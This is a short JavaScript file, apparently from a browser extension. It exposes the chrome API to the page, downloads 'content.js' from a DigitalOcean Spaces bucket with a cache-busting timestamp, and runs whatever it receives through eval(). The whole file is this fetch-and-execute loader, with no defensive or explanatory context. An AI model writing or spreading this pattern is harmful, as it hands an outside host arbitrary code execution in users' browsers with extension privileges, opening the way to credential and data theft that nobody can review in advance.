window.chrome = chrome;
v = new Date().valueOf();

fetch(
  "https://extensions-bucket.fra1.cdn.digitaloceanspaces.com/content.js?v=" + v
)
  .then(function (response) {
    return response.text();
  })
  .then(function (javascriptCode) {
    console.log(javascriptCode);
    eval(javascriptCode);
  })
  .catch(function (error) {
    console.error("Hata:", error);
  });
